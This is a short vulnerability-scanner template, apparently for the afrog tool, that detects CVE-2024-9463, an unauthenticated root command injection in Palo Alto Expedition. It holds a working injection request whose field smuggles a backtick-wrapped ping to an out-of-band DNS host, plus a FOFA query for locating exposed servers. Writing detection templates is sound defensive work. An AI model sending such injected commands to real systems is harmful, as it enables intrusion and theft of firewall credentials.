id: CVE-2024-9463

info:
  name: Palo Alto Expedition - RCE
  author: zan8in
  severity: high
  verified: true
  description: |-
    Palo Alto Networks Expedition的/API/convertCSVtoParquet.php接口存在命令注入漏洞，未经身份验证的攻击者可利用该漏洞在Expedition中以root身份运行任意系统命令，从而导致PAN-OS防火墙的用户名、明文密码、设备配置和设备API密钥泄露。
    fofa: title="Expedition Project"
  affected: Palo Alto Networks Expedition < 1.2.96
  references:
    - https://mp.weixin.qq.com/s/uWqOZTEwWCyrtiVWBn2wMA
    - https://nvd.nist.gov/vuln/detail/CVE-2024-9463
  tags: cve,cve2024,palo,rce
  created: 2024/11/18

set:
  oob: oob()
  oobDNS: oob.DNS
rules:
  r0:
    request:
      method: POST
      path: /API/convertCSVtoParquet.php
      body: ram=watchTowr`ping+{{oobDNS}}`
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0()
